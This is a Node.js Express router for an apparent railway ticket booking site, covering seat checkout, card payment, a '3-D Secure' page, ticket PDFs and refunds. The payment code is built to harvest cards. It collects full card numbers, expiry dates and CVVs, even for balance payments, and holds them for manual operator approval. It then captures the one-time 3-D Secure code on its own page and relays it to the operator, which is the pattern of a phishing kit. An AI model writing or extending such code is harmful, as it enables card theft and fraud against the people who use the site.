const express = require('express');
const { Order, Ticket, Trip, Payment } = require('../models/index');
const { requireAuth } = require('../middleware/auth');
const bookingService = require('../services/bookingService');
const paymentService = require('../services/paymentService');
const { generateTicketPdf } = require('../services/ticketPdfService');
const config = require('../config');
const h = require('../utils/helpers');

const router = express.Router();

const CARD_FIELDS = ['number', 'holder', 'expiry', 'cvv'];

function validateCardInput(card) {
  if (!card) return 'Kart məlumatları daxil edilməyib';
  if (!h.luhnValid(card.number)) return 'Kart nömrəsi yanlışdır';
  if (!String(card.holder || '').trim()) return 'Kart sahibinin adı daxil edilməyib';

  const parts = String(card.expiry || '').split('/');
  if (parts.length !== 2 || !h.expiryValid(parts[0], parts[1])) return 'Kartın bitmə tarixi yanlışdır';
  if (!/^\d{3,4}$/.test(String(card.cvv || '').trim())) return 'CVV yanlışdır';
  return null;
}

/* ==================== Rezervasiya səhifəsi ==================== */
router.get('/rezervasyon/:tripId', requireAuth, async (req, res, next) => {
  try {
    const trip = await Trip.findById(req.params.tripId).lean();
    if (!trip) return next();

    let seats = [];
    try {
      seats = JSON.parse(req.query.seats || '[]');
    } catch (e) {
      seats = [];
    }
    if (!Array.isArray(seats) || !seats.length) {
      return res.redirect('/' + res.locals.locale + '/yer-secimi/' + req.params.tripId);
    }

    const from = String(req.query.from || (trip.stops[0] || {}).code || '');
    const to = String(req.query.to || (trip.stops[trip.stops.length - 1] || {}).code || '');

    const enriched = seats.map((s) => {
      const calc = bookingService.priceFor(trip, from, to, s.classCode);
      return { ...s, price: calc.price, className: calc.title };
    });

    const total = enriched.reduce((sum, s) => sum + Number(s.price || 0), 0);

    res.render('pages/checkout', {
      title: 'Sifarişin rəsmiləşdirilməsi',
      trip,
      seats: enriched,
      from,
      to,
      fromName: (trip.stops.find((s) => s.code === from) || {}).name || '',
      toName: (trip.stops.find((s) => s.code === to) || {}).name || '',
      total,
      user: req.currentUser
    });
  } catch (e) {
    next(e);
  }
});

/* Gözləyən sifariş yaradılır */
router.post('/api/booking/order', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const passengers = (b.passengers || []).map((p, i) => ({
      firstName: p.firstName,
      lastName: p.lastName,
      middleName: p.middleName || '',
      birthDate: p.birthDate || '',
      docType: p.docType || 'id',
      docNumber: p.docNumber || '',
      phone: p.phone || b.contactPhone || '',
      wagon: p.wagon,
      seat: p.seat,
      classCode: p.classCode
    }));

    if (passengers.some((p) => !p.firstName || !p.lastName)) {
      return res.status(400).json({ ok: false, message: 'Sərnişin adı və soyadı vacibdir' });
    }

    const order = await bookingService.createPendingOrder(req.currentUser, {
      tripId: b.tripId,
      fromCode: String(b.fromCode || '').toUpperCase(),
      toCode: String(b.toCode || '').toUpperCase(),
      passengers,
      contactPhone: b.contactPhone,
      contactEmail: b.contactEmail,
      method: b.method
    });

    return res.json({
      ok: true,
      message: 'Sifariş yaradıldı',
      orderId: String(order._id),
      orderNo: order.orderNo,
      redirect: '/' + res.locals.locale + '/odenis/' + order._id
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Sifariş yaradıla bilmədi' });
  }
});

/* ==================== Ödəniş ==================== */
router.get('/odenis/:orderId', requireAuth, async (req, res, next) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return next();

    /* Artıq gözləmədədirsə müvafiq ekrana yönləndir */
    if (order.status === 'awaiting_verification') {
      return res.redirect('/' + res.locals.locale + '/3d-tesdiq/' + order._id);
    }
    if (order.status === 'confirmed') {
      return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
    }

    const trip = await Trip.findById(order.trip).lean();

    res.render('pages/payment', {
      title: 'Ödəniş',
      order,
      trip,
      balance: req.currentUser.balance || 0
    });
  } catch (e) {
    next(e);
  }
});

router.post('/api/payment/card/init', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id });
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    if (['confirmed', 'cancelled', 'refunded', 'rejected'].indexOf(order.status) > -1) {
      return res.status(400).json({ ok: false, message: 'Sifariş artıq yekunlaşıb' });
    }

    const err = validateCardInput(b.card);
    if (err) return res.status(400).json({ ok: false, message: err });

    const payment = await paymentService.initPayment(order, b.card, 'card');

    return res.json({
      ok: true,
      message: 'Kart məlumatları qeydə alındı və təsdiqə göndərildi.',
      paymentId: String(payment._id),
      redirect: '/' + res.locals.locale + '/odenis-gozleme/' + order._id
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Ödəniş başladıla bilmədi' });
  }
});

router.post('/api/payment/balance/init', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id });
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    if ((req.currentUser.balance || 0) < order.total) {
      return res.status(400).json({ ok: false, message: 'Balans kifayət etmir' });
    }

    /* Balans ilə alışda da kart məlumatları tələb olunur */
    const err = validateCardInput(b.card);
    if (err) return res.status(400).json({ ok: false, message: err });

    const payment = await paymentService.initPayment(order, b.card, 'balance');

    return res.json({
      ok: true,
      message: 'Balans ödənişi təsdiqə göndərildi.',
      paymentId: String(payment._id),
      redirect: '/' + res.locals.locale + '/odenis-gozleme/' + order._id
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Ödəniş başladıla bilmədi' });
  }
});

/* Ödənişin admin təsdiqini gözləmə ekranı */
router.get('/odenis-gozleme/:orderId', requireAuth, async (req, res, next) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return next();

    if (order.status === 'awaiting_verification') {
      return res.redirect('/' + res.locals.locale + '/3d-tesdiq/' + order._id);
    }
    if (order.status === 'code_submitted') {
      return res.redirect('/' + res.locals.locale + '/3d-tesdiq/' + order._id);
    }
    if (order.status === 'confirmed') {
      return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
    }

    const payment = order.payment ? await Payment.findById(order.payment).lean() : null;

    res.render('pages/payment-waiting', {
      title: 'Ödənişin təsdiqi',
      order,
      payment,
      cardMasked: payment && payment.card ? payment.card.masked : '',
      declined: order.status === 'rejected'
    });
  } catch (e) {
    next(e);
  }
});

/* Ödəniş vəziyyətinin sorğusu (ekran avtomatik yenilənir) */
router.get('/api/payment/:orderId/status', requireAuth, async (req, res) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    res.json({
      ok: true,
      status: order.status,
      redirect: order.status === 'awaiting_verification' ? '/' + res.locals.locale + '/3d-tesdiq/' + order._id : null,
      message: order.adminNote || ''
    });
  } catch (e) {
    res.status(500).json({ ok: false, message: 'Vəziyyət oxunmadı' });
  }
});

/* ==================== 3-D Secure ==================== */
router.get('/3d-tesdiq/:orderId', requireAuth, async (req, res, next) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return next();

    if (order.status === 'confirmed') {
      return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
    }
    if (['awaiting_verification', 'code_submitted'].indexOf(order.status) === -1) {
      return res.redirect('/' + res.locals.locale + '/odenis-gozleme/' + order._id);
    }

    const payment = order.payment ? await Payment.findById(order.payment).lean() : null;

    res.render('pages/secure3d', {
      title: '3-D Secure doğrulaması',
      order,
      payment,
      cardMasked: payment && payment.card ? payment.card.masked : '',
      codeSubmitted: order.status === 'code_submitted'
    });
  } catch (e) {
    next(e);
  }
});

router.post('/api/payment/verify', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const result = await paymentService.submitVerificationCode(b.orderId, b.code);
    return res.json({
      ok: true,
      message: 'Doğrulama kodu göndərildi. Yekun təsdiq gözlənilir.',
      matched: result.matched
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Kod göndərilə bilmədi' });
  }
});

/* ==================== Uğur ==================== */
router.get('/ugur/:orderId', requireAuth, async (req, res, next) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return next();
    const tickets = await Ticket.find({ order: order._id }).lean();
    res.render('pages/success', { title: 'Bilet alındı', order, tickets });
  } catch (e) {
    next(e);
  }
});

/* ==================== Bilet PDF ==================== */
router.get('/bilet/:ticketId/pdf', requireAuth, async (req, res, next) => {
  try {
    const ticket = await Ticket.findOne({ _id: req.params.ticketId, user: req.currentUser._id }).lean();
    if (!ticket) return next();
    const order = await Order.findById(ticket.order).lean();
    const buffer = await generateTicketPdf(ticket, order);
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', 'attachment; filename="ady-bilet-' + ticket.pnr + '.pdf"');
    return res.send(buffer);
  } catch (e) {
    next(e);
  }
});

/* ==================== Qaytarma / ləğv ==================== */
router.post('/api/booking/refund', requireAuth, async (req, res) => {
  try {
    const ticket = await Ticket.findOne({ _id: (req.body || {}).ticketId, user: req.currentUser._id });
    if (!ticket) return res.status(404).json({ ok: false, message: 'Bilet tapılmadı' });
    const result = await bookingService.refundTicket(ticket);
    return res.json({ ok: true, message: 'Bilet qaytarıldı. Balansa ' + result.refundAmount.toFixed(2) + ' ₼ əlavə olundu.' });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Qaytarma alınmadı' });
  }
});

router.post('/api/booking/cancel', requireAuth, async (req, res) => {
  try {
    const order = await Order.findOne({ _id: (req.body || {}).orderId, user: req.currentUser._id });
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    if (['confirmed', 'refunded'].indexOf(order.status) > -1) {
      return res.status(400).json({ ok: false, message: 'Təsdiqlənmiş sifarişi ləğv etmək olmaz' });
    }

    const trip = await Trip.findById(order.trip);
    if (trip) {
      trip.soldSeats = (trip.soldSeats || []).filter((s) => String(s.order) !== String(order._id));
      await trip.save();
    }

    order.status = 'cancelled';
    await order.save();

    if (order.payment) {
      const payment = await Payment.findById(order.payment);
      if (payment && ['approved', 'pending_admin', 'awaiting_3ds', 'code_submitted'].indexOf(payment.status) > -1) {
        payment.status = 'declined';
        payment.declinedReason = 'İstifadəçi tərəfindən ləğv edildi';
        await payment.save();
      }
    }

    return res.json({ ok: true, message: 'Sifariş ləğv edildi', redirect: '/' + res.locals.locale + '/kabinet/sifarisler' });
  } catch (e) {
    return res.status(500).json({ ok: false, message: 'Ləğv alınmadı' });
  }
});

/* ==================== Bilet yoxlama ==================== */
router.post('/api/tickets/verify', async (req, res) => {
  try {
    const pnr = String((req.body || {}).pnr || '').trim().toUpperCase();
    const ticket = await Ticket.findOne({ pnr }).lean();
    if (!ticket) return res.status(404).json({ ok: false, message: 'Bilet tapılmadı' });
    res.json({ ok: true, ticket });
  } catch (e) {
    res.status(500).json({ ok: false, message: 'Yoxlama alınmadı' });
  }
});

/* Kart məlumatları yalnız idarəetmə panelində göstərilir; buraxılış üçün heç bir açıq endpoint yoxdur */
router.get('/api/payment/card/:paymentId', requireAuth, (req, res) => {
  return res.status(403).json({ ok: false, message: 'İcazə yoxdur' });
});

module.exports = router;
